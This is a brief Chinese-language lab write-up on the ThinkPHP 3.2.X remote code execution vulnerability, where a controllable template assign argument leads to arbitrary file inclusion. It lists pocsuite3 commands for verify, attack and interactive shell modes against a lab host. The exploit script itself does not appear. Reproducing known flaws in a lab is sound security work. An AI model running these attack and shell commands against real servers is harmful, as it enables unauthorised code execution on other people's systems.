# ThinkPHP 3.2.X RCE远程代码执行漏洞

## 漏洞介绍

  ThinkPHP 框架 - 是由上海顶想公司开发维护的 MVC 结构的开源 PHP 框架，遵循 Apache2 开源协议发布，是为了敏捷 WEB 应⽤开发和简化企业应⽤开发⽽诞⽣的。

  2021 年 7 ⽉ 12 ⽇，⽹络上披露针对 ThinkPHP 3.2.X 的远程代码执⾏漏洞利⽤详情， 因业务代码中如果模板赋值⽅法 assign 的第⼀个参数可控，则可导致模板⽂件路径变量被 覆盖为携带攻击代码的⽂件路径，造成任意⽂件包含，执⾏任意代码。 

## 漏洞影响版本

- ThinkPHP 3.2.X

## 漏洞环境

- 操作系统：Linux
- IP地址：10.11.34.64
- ThinkPHP 3.2.3完整版

## 漏洞复现

开启靶机后访问 http:// 10.11.34.64/thinkphp/，此处使用pocsuite3脚本验证。

## 验证模式

```bash
pocsuite -r pocs/ThinkPHP_3_2_x_rce.py -u http:// 10.11.34.64/thinkphp/ --verify
```



## 攻击模式

Linux与Windows平台均兼容，注意不同平台执行命令即可。

```bash
pocsuite -r pocs/ThinkPHP_3_2_x_rce.py -u http:// 10.11.34.64/thinkphp/ --attack –cmd ls
```



## Shell模式

```bash
python3 cli.py -r pocs/ThinkPHP_3_2_x_rce.py  -u http://127.0.0.1:8082/thinkphp/ --shell 
```

**参考链接: https://www.seebug.org/vuldb/ssvid-99297**